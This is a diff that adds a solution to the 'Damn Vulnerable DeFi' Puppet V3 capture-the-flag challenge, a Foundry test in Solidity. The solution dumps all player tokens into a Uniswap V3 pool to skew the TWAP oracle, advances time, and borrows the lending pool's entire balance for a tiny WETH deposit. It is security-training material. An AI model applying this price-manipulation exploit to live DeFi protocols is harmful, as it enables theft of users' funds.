@@ -11,6 +11,9 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+
+
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -112,7 +115,43 @@ contract PuppetV3Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_puppetV3() public checkSolvedByPlayer {}
+    function test_puppetV3() public checkSolvedByPlayer {
+        ISwapRouter swapRouter = ISwapRouter(address(0xE592427A0AEce92De3Edee1F18E0157C05861564));
+    
+        emit log_named_decimal_uint("player ETH balance before price manipulation", player.balance, 18);
+        emit log_named_decimal_uint("player DVT balance before price manipulation", token.balanceOf(player), 18);
+
+        token.approve(address(swapRouter),PLAYER_INITIAL_TOKEN_BALANCE);
+        uint256 wethAmountOut =swapRouter.exactInputSingle(ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(token),
+            tokenOut: address(weth),
+            fee: FEE,
+            recipient: player,
+            deadline: block.timestamp,
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMinimum: 0,
+            sqrtPriceLimitX96: 0
+        }));
+        
+        console.log();
+        console.log("swap completed");
+        
+        emit log_named_decimal_uint("wethAmountOut from swapping player's all DVTs", wethAmountOut, 18);
+        emit log_named_decimal_uint("player ETH balance after price manipulation", player.balance, 18);
+        emit log_named_decimal_uint("player DVT balance after price manipulation", token.balanceOf(player), 18);
+        emit log_named_decimal_uint("player WETH balance after price manipulation", weth.balanceOf(player), 18);
+        
+        vm.warp(block.timestamp + 114);
+        
+        uint256 wethRequiredAfter = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        emit log_named_decimal_uint("WETH Required after price manipulation", wethRequiredAfter, 18);
+        
+        weth.approve(address(lendingPool), 0.2 ether);
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        emit log_named_decimal_uint("player DVT balance after price manipulation", token.balanceOf(player), 18);
+        
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
